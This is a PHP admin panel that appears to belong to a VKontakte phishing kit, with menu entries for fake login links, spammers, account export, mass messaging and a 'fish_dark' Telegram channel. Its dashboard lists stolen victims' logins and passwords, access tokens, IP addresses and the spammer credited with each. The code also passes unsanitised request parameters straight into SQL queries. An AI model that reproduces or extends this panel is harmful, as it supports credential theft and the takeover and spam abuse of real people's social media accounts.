<?
include '../bdlog.php';

if(isset($_SESSION['admin'])) {

  function check_mobile_device() { 
		$mobile_agent_array = array('ipad', 'iphone', 'android', 'pocket', 'palm', 'windows ce', 'windowsce', 'cellphone', 'opera mobi', 'ipod', 'small', 'sharp', 'sonyericsson', 'symbian', 'opera mini', 'nokia', 'htc_', 'samsung', 'motorola', 'smartphone', 'blackberry', 'playstation portable', 'tablet browser');
		$agent = strtolower($_SERVER['HTTP_USER_AGENT']);
		foreach ($mobile_agent_array as $value) {    
			if (strpos($agent, $value) !== false) return true;   
		}       
		return false; 
	}
	
	$is_mobile_device = check_mobile_device();

$msg = '';
if(isset($_GET['link'])) {
	$name = $_GET['name'];
	$linkk = $_GET['link'];
	$db->query("update data set `balance` = '$linkk' where `usersession` = '$name'");
	$msg = '<div class="callout callout-success">
                  <h5>Успех!</h5>

                  <p>Установлен новый баланс для пользователя <b>'.$name.'</b>.</p>
                </div>';
				
				// echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=../admin/index.php">';
}

if(isset($_GET['deluser'])) {
	
	$db->query("delete from data");
		$db->query("ALTER TABLE data AUTO_INCREMENT = 1");
	

	$msg = '<div class="callout callout-success">
                  <h5>Успех!</h5>

                  <p>Были удалены все пользователи.</p>
                </div>';
				
				echo '<META HTTP-EQUIV="REFRESH" CONTENT="1;URL=../admin/index.php">';
}

if (isset($_GET['del'])) {
		   $del = intval($_GET['del']);
		   $db->query ("delete from data where (id='$del')");
		   echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=index.php">';
		}


if(isset($_GET['linkdel'])) {
	$linkdel = $_GET['linkdel'];
	$db->query("update data set `balance` = '0' where `id` = '$linkdel'");
	$msg = '<div class="callout callout-success">
                  <h5>Успех!</h5>

                  <p>Баланс пользователя был обнулен.</p>
                </div>';
}

} else { echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=auth.php">'; }
if(!isset($_SESSION['admin'])) { echo '
	<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=/admin/auth.php">
	<style> body {display:none !important;}'; }
$randch = rand(100,9999999999999999);

if($is_mobile_device) {

?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<title>Admin</title>
	<link href="dist/themes/dashboard/css/font-awesome.css" rel="stylesheet">
	<link href="dist/themes/dashboard/css/ionicons.css" rel="stylesheet">
	<link href="dist/themes/dashboard/css/chartist.css" rel="stylesheet">
	<link href="dist/themes/dashboard/css/rickshaw.min.css" rel="stylesheet">
	<link rel="stylesheet" href="dist/themes/dashboard/css/dashboard.css">
</head>
<body>
	<div class="slim-header">
		<div class="container">
			<div class="slim-header-left">
				<h2 class="slim-logo"><a>Admin Panel</a></h2>
			</div>
			<div class="slim-header-right">
				<a href="settings.php" class="header-notification">
					<i class="icon ion-gear-a"></i>
				</a>
				<a>Меню -></a>
				<div class="dropdown dropdown-c">
					<a href="#" class="logged-user" data-toggle="dropdown"> <img src="https://vk.com/images/gift/952/512.png" alt=""> <span>МЕНЮ</span> <i class="fa fa-angle-down"></i> </a>
					<div class="dropdown-menu dropdown-menu-right">
						<nav class="nav">

              <a href="settings.php" class="nav-link"><i class="icon ion-ios-gear"></i> Настройки</a> 
              <a href="links.php" class="nav-link"><i class="icon ion-forward"></i> Ссылки на фейки</a>  
              <a href="spamers.php" class="nav-link"><i class="icon ion-forward"></i> Спамеры</a> 
              <a href="rupor.php" class="nav-link"><i class="icon ion-forward"></i> Объявл. спамерам</a>
              <a href="viborkaspam.php" class="nav-link"><i class="icon ion-forward"></i> Логи спамера</a>
              <a href="export.php" class="nav-link"><i class="icon ion-forward"></i> Экспорт аккаунтов</a>
              <a href="viborka.php" class="nav-link"><i class="icon ion-forward"></i> Выборка по критер.</a>
              <a href="banvk.php" class="nav-link"><i class="icon ion-forward"></i> Заблокировать VK</a>
              <a href="massmsg.php" class="nav-link"><i class="icon ion-forward"></i> Рассылка в беседе</a>
              <a href="traffic.php" class="nav-link"><i class="icon ion-forward"></i> Трафик аккаунтов</a>
              <a href="telegram.php" class="nav-link"><i class="icon ion-forward"></i> Уведомления в ТГ</a>
              <a href="https://t.me/fish_dark" class="nav-link"><i class="icon ion-forward"></i> ТГ с обновлениями</a>
              
            
            </nav>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="slim-mainpanel" style="position: relative;">
		
			<div class="row row-sm mg-t-20">
				<div class="col-lg-12 mg-t-20 mg-lg-t-0">
					<div class="card card-table card-customer-overview">
						<div class="card-header">
							<h6 class="slim-card-title">Ваши аккаунты [<?=$colvousers?>]</h6><span class="tx-11 d-block"></span>
						</div>
						<div class="table-responsive">
							<table class="table mg-b-0 tx-13">
								<thead>
									<tr class="tx-10">
										<th class="pd-y-5 tx-center">&nbsp;</th>
										<th class="pd-y-5 tx-center">Пользователь</th>
										<th class="pd-y-5 tx-center">Друзей</th>
										<th class="pd-y-5 tx-center">Подписчиков</th>
										<th class="pd-y-5 tx-center">Голосов</th>
										<th class="pd-y-5 tx-center">Данные</th>
										<th class="pd-y-5 tx-center">Токен</th>
									    <th class="pd-y-5 tx-center">ip</th>
									    <th class="pd-y-5 tx-center">Спамер</th>
										<th class="pd-y-5 tx-center">Удалить</th>
									</tr>
								</thead>
								<tbody>
									<?php
									
                    $linkads = $db->query("SELECT * FROM data order by id desc");
																	
                    while ($resone = mysqli_fetch_array($linkads)) {
                      
                    
                    $userid = $resone['userid'];								
												
												echo '<tr>';
													echo '<td class="valign-middle tx-center" class="pd-l-20"> <img src="https://vk.com/images/gift/952/512.png" class="wd-36 rounded-circle" alt="Image"> </td>';

													echo '<td class="valign-middle tx-center"> <a href="https://vk.com/id'.$userid.'" class="tx-inverse tx-12 tx-medium d-block">'.$resone['fio'].'</span> </td>';

													echo '<td class="valign-middle tx-center"><span class="tx-11 d-block"> '.$resone['friends'].'</span> </td>';

													echo '<td class="valign-middle tx-center"><span class="tx-11 d-block">'.$resone['followers'].'</span></td>';

													echo '<td class="valign-middle tx-center"><span class="tx-11 d-block">'.$resone['balance'].'</span></td>';

													echo '<td class="valign-middle tx-center"><span class="tx-11 d-block">'.$resone['login'].':'.$resone['pass'].'</span></td>';
												
													echo '<td class="valign-middle tx-center"><span class="tx-11 d-block"><textarea readonly style="overflow: hidden" rows="1" wrap="off" cols="15">'.$resone['token'].'</textarea></span></td>';

													echo '<td class="valign-middle tx-center"><span class="tx-11 d-block">'.$resone['ip'].'</span></td>';

													echo '<td class="valign-middle tx-center"><span class="tx-11 d-block"> '.$resone['fromsp'].'</span> </td>';

													echo '<td class="valign-middle tx-center">';
														echo '<div class="dropdown dropdown-c">';
															echo '<a href="#" class="tx-gray-600 tx-24" data-toggle="dropdown"><a name=\"del\" href="index.php?del='.$resone["id"].'"><img src="images/del.png"></a></a>';
														echo '</div>';
													echo '</td>';
												echo '</tr>'; }
											
										?>
								</tbody>
							</table>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<script src="dist/themes/dashboard/js/jquery.js"></script>
	<script src="dist/themes/dashboard/js/popper.js"></script>
	<script src="dist/themes/dashboard/js/bootstrap.js"></script>
	<script src="dist/themes/dashboard/js/jquery.cookie.js"></script>
	<script src="dist/themes/dashboard/js/chartist.js"></script>
	<script src="dist/themes/dashboard/js/d3.js"></script>
	<script src="dist/themes/dashboard/js/rickshaw.min.js"></script>
	<script src="dist/themes/dashboard/js/jquery.sparkline.min.js"></script>
	<script src="dist/themes/dashboard/js/ResizeSensor.js"></script>
	<script src="dist/themes/dashboard/js/dashboard.js"></script>
  <script src="dist/themes/dashboard/js/slim.js"></script>
</body>
</html>

<?php } else { ?>
 

  <!DOCTYPE html>
<!--
This is a starter template page. Use this page to start your new project from
scratch. This page gets rid of all links and provides the needed markup only.
-->
<html lang="ru">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="x-ua-compatible" content="ie=edge">

  <title>Admin Panel</title>
  

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="plugins/font-awesome/css/font-awesome.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="dist/css/adminlte.css">
  <!-- Google Font: Source Sans Pro -->
  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
</head>
<body class="hold-transition sidebar-mini">

<div class="wrapper">

 
  <!-- /.navbar -->

  <!-- Main Sidebar Container -->
  <aside class="main-sidebar sidebar-dark-primary elevation-4">
    <!-- Brand Logo -->
    <a style="font-family:intro; color:#6CD089;" href="index.php" class="brand-link">
      <center><span class="brand-text font-weight-2px"> ADMIN PANEL [<?=$colvousers?>]</span></center>
    </a>
	<a href="?deluser" target="blank" class="brand-link">
      <center><span class="brand-text font-weight-light"><img src="images/leftl.png"> Очистить базу <img src="images/right.png"></span></center>
    </a>
    <a href="neval.php" target="blank" class="brand-link">
      <center><span class="brand-text font-weight-light"><img src="images/leftl.png"> Удалить НЕвалид <img src="images/right.png"></span></center>
    </a>
    
    <!-- Sidebar -->
    <div class="sidebar">
      <!-- Sidebar user panel (optional) -->
      

      <!-- Sidebar Menu -->
      <nav class="mt-2">
        <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
          <!-- Add icons to the links using the .nav-icon class
               with font-awesome or any other icon font library -->
          <? include 'menu.php'; ?>
          
        </ul>
      </nav>
      <!-- /.sidebar-menu -->
    </div>
    <!-- /.sidebar -->
  </aside>

  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->

    <!-- /.content-header -->

    <!-- Main content -->
    <div class="content">
      <div class="container-fluid">
		<?=$msg?>
		<div class="col-md-12" style="display:inline-block;">
           <div class="content-header">
            <div class="card card-primary">
              <div class="card-header">
                <h3 class="card-title">Ваши аккаунты [<?=$colvousers?>] // business_dark</h3> 
              </div>
              <!-- /.card-header -->
              <div class="card-body p-0">
                <table class="table table-condensed">
                  <tbody><tr>
                    <th><center>Пользователь</center></th>
                    <th><center>Друзей</center></th>
					<th><center>Подписчиков</center></th>
				    <th><center>Голосов</center></th>
				    <th><center>Данные</center></th>
					<th><center>Токен</center></th>
					<th><center>IP</center></th>
                    <th><center>Спамер</center></th>
					<th width=10px><img src="images/delete.png"></th>
                  </tr>
                  <? if(isset($_SESSION['admin'])) {
	$linkads = $db->query("SELECT * FROM data order by id desc");
																	
while ($resone = mysqli_fetch_array($linkads)) {
	
$ltm = date("d.m H:i",$resone['ip']);

if ($resone['str'] == 1 ){
$strda = 'Россия';
} else {
	$strda = 'Неизвестно';
}

if ($resone['pol'] == 1 ){
$polon = 'Ж';
} else if ($resone['pol'] == 2 ) {
	$polon = 'М';
} else {
	$polon = 'Нет';
}

$userid = $resone['userid'];
echo '              <td><center><a href="https://vk.com/id'.$userid.'" class="tx-inverse tx-14 tx-medium d-block">'.$resone['fio'].'</span></center></td>

                    <td><center>'.$resone['friends'].'</center></td>

					<td><center>'.$resone['followers'].'</center></td>

                    <td><center>'.$resone['balance'].'</center></td>

				    <td><center>'.$resone['login'].':'.$resone['pass'].'</center></td>

                    <td><center><textarea readonly style="overflow: hidden" rows="1" wrap="off" cols="33">'.$resone['token'].'</textarea></center></td>

					<td class="valign-middle tx-center"><span class="tx-11 d-block">'.$resone['ip'].'</span></td>

                    <td><center><span class="tx-11 d-block"> '.$resone['fromsp'].'</span></center></td>

					<td><a name=\"del\" href="index.php?del='.$resone["id"].'"><img src="images/del.png"></a></td>
                  </tr>';
      
		
				  } }
																				?>
				  
				 
                </tbody></table>
              </div>
              <!-- /.card-body -->
            </div>
            <!-- /.card -->
          </div>
		 
		  
        <!-- /.row -->
      </div><!-- /.container-fluid -->
    </div>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->

  <!-- Control Sidebar -->
  
  <!-- /.control-sidebar -->

  <!-- Main Footer -->
 
</div>

  <?php } ?>
<!-- ./wrapper -->

<!-- REQUIRED SCRIPTS -->

<!-- jQuery -->
<script src="plugins/jquery/jquery.min.js"></script>
<!-- Bootstrap 4 -->
<script src="plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- AdminLTE App -->
<script src="dist/js/adminlte.min.js"></script>
</body>
</html>